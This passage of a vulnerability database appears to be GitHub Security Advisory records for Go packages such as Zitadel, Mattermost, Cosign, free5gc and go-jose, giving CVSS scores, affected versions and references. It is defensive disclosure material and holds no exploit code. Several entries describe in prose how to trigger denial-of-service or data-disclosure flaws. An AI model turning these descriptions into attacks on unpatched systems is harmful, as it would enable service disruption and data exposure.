[2.40.5](https://github.com/zitadel/zitadel/releases/tag/v2.40.5)\n2.38.x versions are fixed on >= [2.38.3](https://github.com/zitadel/zitadel/releases/tag/v2.38.3)\n\n### Workarounds\n\nThere is no workaround since a patch is already available.\n\n### References\n\nNone\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.39.0"}, {"fixed": "2.40.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.38.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zitadel/zitadel/security/advisories/GHSA-7h8m-vrxx-vr4m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47111"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/commit/22e2d5599918864877e054ebe82fb834a5aa1077"}, {"type": "PACKAGE", "url": "https://github.com/zitadel/zitadel"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.38.3"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.40.5"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-08T17:52:50Z", "nvd_published_at": "2023-11-08T22:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p5pr-vm3j-jxxf", "modified": "2023-11-28T20:49:52Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-45223"], "summary": "Mattermost Exposure of Sensitive Information to an Unauthorized Actor vulnerability", "details": "Mattermost fails to properly validate the \"Show Full Name\" option in a few endpoints in Mattermost Boards, allowing a member to get the full name of another user even if the Show Full Name option was disabled.\u00a0\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45223"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:49:52Z", "nvd_published_at": "2023-11-27T10:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r6cc-7wj7-gfx2", "modified": "2023-11-03T20:42:49Z", "published": "2023-11-03T18:30:24Z", "aliases": ["CVE-2023-3893"], "summary": "Kubernetes csi-proxy vulnerable to privilege escalation due to improper input validation", "details": "Kubernetes is vulnerable to privilege escalation when a user that can create pods on Windows nodes running kubernetes-csi-proxy may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they include Windows nodes running kubernetes-csi-proxy.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/csi-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0-alpha.0"}, {"fixed": "2.0.0-alpha.1"}]}], "versions": ["2.0.0-alpha.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/csi-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.1.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3893"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/119594"}, {"type": "WEB", "url": "https://github.com/kubernetes-csi/csi-proxy/commit/0e83a68159111e4ee510f5aa56d47ba97bda60c7"}, {"type": "WEB", "url": "https://github.com/kubernetes-csi/csi-proxy/commit/2523e6674dedf3de27f84235efec28555da24664"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes-csi/csi-proxy"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/lWksE2BoCyQ"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231221-0004/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-03T20:42:49Z", "nvd_published_at": "2023-11-03T18:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6944-6pmv-6mp2", "modified": "2023-11-21T19:40:09Z", "published": "2023-11-16T00:30:55Z", "aliases": ["CVE-2023-47345"], "summary": "free5gc Buffer Overflow vulnerability", "details": "Buffer Overflow vulnerability in free5gc 3.3.0 allows attackers to cause a denial of service via crafted PFCP message with malformed PFCP Heartbeat message whose Recovery Time Stamp IE length is mutated to zero.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/free5gc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47345"}, {"type": "WEB", "url": "https://github.com/free5gc/free5gc/issues/483"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/free5gc"}], "database_specific": {"cwe_ids": ["CWE-120"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-16T21:01:33Z", "nvd_published_at": "2023-11-15T22:15:27Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q27h-hw2v-x5jm", "modified": "2023-11-17T14:58:08Z", "published": "2023-11-17T00:31:06Z", "aliases": ["CVE-2023-47025"], "summary": "Free5gc allows a local attacker to cause a denial of service via the free5gc-compose component", "details": "An issue in Free5gc v.3.3.0 allows a local attacker to cause a denial of service via the free5gc-compose component.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/free5gc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47025"}, {"type": "WEB", "url": "https://github.com/free5gc/free5gc/issues/501"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/free5gc"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-17T14:58:08Z", "nvd_published_at": "2023-11-16T23:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfp6-jrw2-99g9", "modified": "2023-11-08T15:02:51Z", "published": "2023-11-08T15:02:51Z", "aliases": ["CVE-2023-46737"], "summary": "Cosign vulnerable to possible endless data attack from attacker-controlled registry", "details": "### Summary\nCosign is susceptible to a denial of service by an attacker controlled registry. An attacker who controls a remote registry can return a high number of attestations and/or signatures to Cosign and cause Cosign to enter a long loop resulting in an endless data attack. The root cause is that Cosign loops through all attestations fetched from the remote registry in `pkg/cosign.FetchAttestations`.\n\nThe attacker needs to compromise the registry or make a request to a registry they control. When doing so, the attacker must return a high number of attestations in the response to Cosign. The result will be that the attacker can cause Cosign to go into a long or infinite loop that will prevent other users from verifying their data. In Kyvernos case, an attacker whose privileges are limited to making requests to the cluster can make a request with an image reference to their own registry, trigger the infinite loop and deny other users from completing their admission requests. Alternatively, the attacker can obtain control of the registry used by an organization and return a high number of attestations instead the expected number of attestations.\n\nThe vulnerable loop in Cosign starts on line 154 below:\nhttps://github.com/sigstore/cosign/blob/004443228442850fb28f248fd59765afad99b6df/pkg/cosign/fetch.go#L135-L196\n\nThe `l` slice is controllable by an attacker who controls the remote registry.\n\nMany cloud-native projects consider the remote registry to be untrusted, including Crossplane, Notary and Kyverno. We consider the same to be the case for Cosign, since users are not in control of whether the registry returns the expected data.\n\nTUF's security model labels this type of vulnerability an [\"Endless data attack\"](https://theupdateframework.io/security/), but an attacker could use this as a type of rollback attack, in case the user attempts to deploy a patched version of a vulnerable image; The attacker could prevent this upgrade by causing Cosign to get stuck in an infinite loop and never complete.\n\n### Mitigation\nThe issue can be mitigated rather simply by setting a limit to the limit of attestations that Cosign will loop through. The limit does not need to be high to be within the vast majority of use cases and still prevent the endless data attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/cosign"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.13.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/sigstore/cosign/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/cosign/security/advisories/GHSA-vfp6-jrw2-99g9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46737"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/pull/3364"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/commit/8ac891ff0e29ddc67965423bee8f826219c6eb0f"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/cosign"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/releases/tag/v1.13.2"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/releases/tag/v2.2.1"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-835"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-11-08T15:02:51Z", "nvd_published_at": "2023-11-07T18:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-85jj-c9jr-9jhx", "modified": "2023-11-28T20:53:16Z", "published": "2023-11-27T12:30:55Z", "aliases": ["CVE-2023-6202"], "summary": "Mattermost Improper Access Control vulnerability", "details": "Mattermost fails to perform proper authorization in the `/plugins/focalboard/api/v2/users` endpoint allowing an attacker who is a guest user and knows the ID of another user\u00a0to get their information (e.g. name, surname, nickname) via Mattermost Boards.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6202"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:53:16Z", "nvd_published_at": "2023-11-27T10:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xvrc-2wvh-49vc", "modified": "2023-11-14T20:31:23Z", "published": "2023-11-14T20:31:23Z", "aliases": ["CVE-2023-47122"], "summary": "Gitsign's Rekor public keys fetched from upstream API instead of local TUF client.", "details": "### Impact\n\nIn certain versions of gitsign, Rekor public keys were fetched via the Rekor API, instead of through the local TUF client. If the upstream Rekor server happened to be compromised, gitsign clients could potentially be tricked into trusting incorrect signatures.\n\nThere is no known compromise the default public good instance (`rekor.sigstore.dev`) - anyone using this instance is unlikely to be affected.\n\n### Patches\n\nThis was fixed in v0.8.0 via https://github.com/sigstore/gitsign/pull/399\n\n### Workarounds\n\nn/a\n\n### References\n_Are there any links users can visit to find out more?_\n\nhttps://docs.sigstore.dev/about/threat-model/#sigstore-threat-model", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/gitsign"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.6.0"}, {"fixed": "0.8.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/gitsign/security/advisories/GHSA-xvrc-2wvh-49vc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47122"}, {"type": "WEB", "url": "https://github.com/sigstore/gitsign/pull/399"}, {"type": "WEB", "url": "https://github.com/sigstore/gitsign/commit/cd66ccb03c86a3600955f0c15f6bfeb75f697236"}, {"type": "WEB", "url": "https://docs.sigstore.dev/about/threat-model/#sigstore-threat-model"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/gitsign"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-14T20:31:23Z", "nvd_published_at": "2023-11-10T22:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3487-3j7c-7gwj", "modified": "2023-12-04T15:20:28Z", "published": "2023-11-27T12:30:55Z", "aliases": ["CVE-2023-48369"], "summary": "Mattermost Uncontrolled Resource Consumption vulnerability", "details": "Mattermost fails to limit the log size of server logs allowing an attacker sending specially crafted requests to different endpoints to potentially overflow the log. \n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48369"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:47:54Z", "nvd_published_at": "2023-11-27T10:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-392h-r46j-q24p", "modified": "2023-11-28T17:17:02Z", "published": "2023-11-28T00:30:33Z", "aliases": ["CVE-2023-46480"], "summary": "OwnCast remote code execution vulnerability", "details": "An issue in OwnCast v.0.1.1 allows a remote attacker to execute arbitrary code and obtain sensitive information via the authHost parameter of the indieauth function.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/owncast/owncast"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46480"}, {"type": "PACKAGE", "url": "https://github.com/owncast/owncast"}, {"type": "WEB", "url": "https://github.com/shahzaibak96/CVE-2023-46480"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T17:17:02Z", "nvd_published_at": "2023-11-27T23:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6758-979h-249x", "modified": "2023-11-07T21:46:04Z", "published": "2023-11-07T21:46:04Z", "aliases": ["CVE-2023-46254"], "summary": "capsule-proxy service discloses Namespaces of colliding tenants to owners of different tenants with the same ServiceAccount name", "details": "### Summary\n\nA bug in the RoleBinding reflector used by `capsule-proxy` gives ServiceAccount tenant owners the right to list Namespaces of other tenants backed by the same owner kind and name.\n\n### Details\n\n- Tenant `solar`, owned by a ServiceAccount named `tenant-owner` in the Namespace `solar`\n- Tenant `wind`, owned by a ServiceAccount named `tenant-owner` in the Namespace `wind`\n\n> Please, notice the same ServiceAccount name, although in different namespaces.\n\nThe Tenant owner `solar` would be able to list the namespaces of the Tenant `wind` and vice-versa, although this is not correct.\n\nThe bug introduces an exfiltration vulnerability since allows the listing of Namespace resources of other Tenants, although just in some specific conditions:\n\n1. `capsule-proxy` runs with the `--disable-caching=false` (default value: `false`)\n2. Tenant owners are ServiceAccount, with the same resource name, but in different Namespaces.\n\nThe CVE doesn't allow any privilege escalation on the outer tenant Namespace-scoped resources, since the Kubernetes RBAC is enforcing this.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectcapsule/capsule"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.5"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.4"}}, {"package": {"ecosystem": "Go", "name": "github.com/projectcapsule/capsule-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.5"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.4"}}], "references": [{"type": "WEB", "url": "https://github.com/projectcapsule/capsule-proxy/security/advisories/GHSA-6758-979h-249x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46254"}, {"type": "WEB", "url": "https://github.com/projectcapsule/capsule-proxy/commit/615202f7b02eaec7681336bd63daed1f39ae00c5"}, {"type": "PACKAGE", "url": "https://github.com/projectcapsule/capsule-proxy"}, {"type": "WEB", "url": "https://github.com/projectcapsule/capsule-proxy/releases/tag/v0.4.5"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-07T21:46:04Z", "nvd_published_at": "2023-11-06T19:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xwh9-gc39-5298", "modified": "2023-12-05T21:57:32Z", "published": "2023-11-28T17:36:21Z", "aliases": ["CVE-2023-45286"], "summary": "github.com/go-resty/resty/v2 HTTP request body disclosure", "details": "A race condition in go-resty can result in HTTP request body disclosure across requests.\n\nThis condition can be triggered by calling sync.Pool.Put with the same *bytes.Buffer more than once, when request retries are enabled and a retry occurs. The call to sync.Pool.Get will then return a bytes.Buffer that hasn't had bytes.Buffer.Reset called on it. This dirty buffer will contain the HTTP request body from an unrelated request, and go-resty will append the current HTTP request body to it, sending two bodies in one request.\n\nThe sync.Pool in question is defined at package level scope, so a completely unrelated server could receive the request body.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-resty/resty/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45286"}, {"type": "WEB", "url": "https://github.com/go-resty/resty/issues/739"}, {"type": "WEB", "url": "https://github.com/go-resty/resty/issues/743"}, {"type": "WEB", "url": "https://github.com/go-resty/resty/pull/745"}, {"type": "PACKAGE", "url": "https://github.com/go-resty/resty"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-2328"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-362"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T17:36:21Z", "nvd_published_at": "2023-11-28T17:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5r5h-q934-cccp", "modified": "2023-11-08T14:52:23Z", "published": "2023-11-06T18:30:19Z", "aliases": ["CVE-2023-41378"], "summary": "Calico Typha denial of service vulnerability", "details": "In certain conditions for Calico Typha (v3.26.2, v3.25.1 and below), and Calico Enterprise Typha (v3.17.1, v3.16.3, v3.15.3 and below), a client TLS handshake can block the Calico Typha server indefinitely, resulting in denial of service. The TLS Handshake() call is performed inside the main server handle for loop without any timeout allowing an unclean TLS handshake to block the main loop indefinitely while other connections will be idle waiting for that handshake to finish.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectcalico/calico"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.26.0"}, {"fixed": "3.26.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/projectcalico/calico"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.25.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41378"}, {"type": "WEB", "url": "https://github.com/projectcalico/calico/pull/7908"}, {"type": "WEB", "url": "https://github.com/projectcalico/calico/pull/7993"}, {"type": "WEB", "url": "https://github.com/projectcalico/calico/commit/2ebc1f92ecc39332cf1d55ba676d9101af24982f"}, {"type": "WEB", "url": "https://github.com/projectcalico/calico/commit/ad8bd001e650ec7742ac30e58247e7eef5956125"}, {"type": "PACKAGE", "url": "https://github.com/projectcalico/calico"}, {"type": "WEB", "url": "https://www.tigera.io/security-bulletins-tta-2023-001/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-08T14:52:23Z", "nvd_published_at": "2023-11-06T16:15:42Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2c7c-3mj9-8fqh", "modified": "2023-11-21T22:17:19Z", "published": "2023-11-21T22:17:19Z", "aliases": [], "summary": "Decryption of malicious PBES2 JWE objects can consume unbounded system resources", "details": "The go-jose package is subject to a \"billion hashes attack\" causing denial-of-service when decrypting JWE inputs. This occurs when an attacker can provide a PBES2 encrypted JWE blob with a very large p2c value that, when decrypted, produces a denial-of-service.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-jose/go-jose/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/square/go-jose"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/go-jose/go-jose/issues/64"}, {"type": "WEB", "url": "https://github.com/go-jose/go-jose/commit/65351c27657d58960c2e6c9fbb2b00f818e50568"}, {"type": "PACKAGE", "url": "https://github.com/go-jose/go-jose"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-21T22:17:19Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wp76-cf2j-rqq7", "modified": "2023-11-20T22:06:53Z", "published": "2023-11-11T18:30:25Z", "aliases": ["CVE-2023-47390"], "summary": "Headscale writes bearer tokens to info-level logs", "details": "Headscale through 0.22.3 writes bearer tokens to info-level logs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/juanfont/headscale"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.22.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47390"}, {"type": "WEB", "url": "https://github.com/juanfont/headscale/issues/1259"}, {"type": "PACKAGE", "url": "https://github.com/juanfont/headscale"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-14T20:35:07Z", "nvd_published_at": "2023-11-11T18:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jcgv-3pfq-j4hr", "modified": "2023-11-28T20:50:03Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-35075"], "summary": "Mattermost Injection vulnerability", "details": "Mattermost fails to use\u00a0innerText /\u00a0textContent\u00a0when setting the channel name in the webapp during autocomplete, allowing an attacker to inject HTML to a victim's page by create a channel name that is valid HTML. No XSS is possible though.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35075"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-74"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:50:03Z", "nvd_published_at": "2023-11-27T10:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8pgv-569h-w5rw", "modified": "2023-11-12T15:55:39Z", "published": "2023-11-12T15:55:39Z", "aliases": ["CVE-2023-47108"], "summary": "otelgrpc DoS vulnerability due to unbound cardinality metrics ", "details": "### Summary\n\nThe grpc Unary Server Interceptor [opentelemetry-go-contrib/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327)\n\n```\n// UnaryServerInterceptor returns a grpc.UnaryServerInterceptor suitable\n// for use in a grpc.NewServer call.\nfunc UnaryServerInterceptor(opts ...Option) grpc.UnaryServerInterceptor {\n```\n  \nout of the box adds labels\n\n- `net.peer.sock.addr`\n- `net.peer.sock.port`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent.\n\n### Details\n\nAn attacker can easily flood the peer address and port for requests.  \n\n### PoC\n\nApply the attached patch to the example and run the client multiple times.  Observe how each request will create a unique histogram and how the memory consumption increases during it.\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use  [UnaryServerInterceptor](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327), and does not filter any client IP address and ports via middleware or proxies, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities.\n\n* [GHSA-rcjv-mgp8-qvmr](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-rcjv-mgp8-qvmr) ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-5r5m-65gx-7vrh](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh \"GHSA-5r5m-65gx-7vrh\") ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-cg3q-j54f-5p7p](https://github.com/advisories/GHSA-cg3q-j54f-5p7p \"GHSA-cg3q-j54f-5p7p\") ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected, a view removing the attributes can be used.\n\nThe other possibility is to disable grpc metrics instrumentation by passing [`otelgrpc.WithMeterProvider`](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/instrumentation/google.golang.org/grpc/otelgrpc/v0.45.0/instrumentation/google.golang.org/grpc/otelgrpc/config.go#L138) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322), to be released with v0.46.0, the attributes were removed.\n\n### References\n\n- [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc"}, "ranges": [{"type": "ECOSYSTEM", "events": 